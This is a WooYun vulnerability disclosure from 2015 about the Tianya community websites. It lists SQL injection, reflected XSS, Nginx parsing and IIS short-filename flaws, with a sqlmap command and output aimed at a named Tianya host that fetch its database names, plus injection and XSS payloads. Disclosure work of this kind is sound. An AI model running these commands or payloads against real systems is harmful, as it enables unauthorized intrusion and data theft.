wybug_title: 天涯社区漏洞打包（SQL注入/文件解析漏洞/XSS等）
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-08-04：	细节已通知厂商并且等待厂商处理中									2015-08-09：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 666666666666666 详细说明：  http://bbs.tianya.cn/resin-doc/viewfile/?contextpath=/&servletpath=&file=fakefile.xmlhttp://wenda.tianya.cn/search.jsp POST参数q疑似注入http://passport.tianya.cn/countryTel/json.do?var=--%3E%27%22%3E%3CH1%3EXSS%40HERE%3C%2FH1%3E这么终于的服务器上竟然有反射XSS合理处理json数据http://open.tianya.cn/static/js/my_popbox_js.js/a.phpNginx解析漏洞http://ebook.tianya.cn/iis短文件名可枚举文件http://apps.tianya.cn/static/upgrade2/css/style.css/a.phpNginx解析漏洞   漏洞证明：  
sqlmap.py -u "http://content.tianya.cn/comment/ForumCommentDo.jsp" --data "articleid=1" --dbsSQL盲注         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150213}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 19:30:23[19:30:23] [INFO] resuming back-end DBMS 'mysql'[19:30:23] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: articleid (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: articleid=1) AND 6387=6387 AND (1274=1274    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: articleid=1) AND (SELECT * FROM (SELECT(SLEEP(5)))iCdI) AND (6781=6781---[19:30:24] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0.11[19:30:24] [INFO] fetching database names[19:30:24] [INFO] fetching number of databases[19:30:24] [INFO] resumed: 4[19:30:24] [INFO] resumed: information_schema[19:30:24] [INFO] resumed: egse7i\\7n\\7n\\7B\\7n[19:30:24] [INFO] resumed: tgss\x13%J\x13%J\x13%J\x13%J\x13%[19:30:24] [INFO] resumed: tianya_cms_bptjcmjavailable databases [4]:[*] `egse7i\7n\7n\7B\7n`[*] `tgss%J%J%J%J%`[*] information_schema[*] tianya_cms_bptjcmj[19:30:24] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\content.tianya.cn'[*] shutting down at 19:30:24
   修复方案：  你们有开发的，交给开发解决。   版权声明：转载请注明来源 陆由乙@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-08-09 12:00 厂商回复：  漏洞Rank：8  (WooYun评价) 最新状态： 2015-08-10：相关漏洞已经修复，在此感谢漏洞发现者对我们安全问题的善意提醒
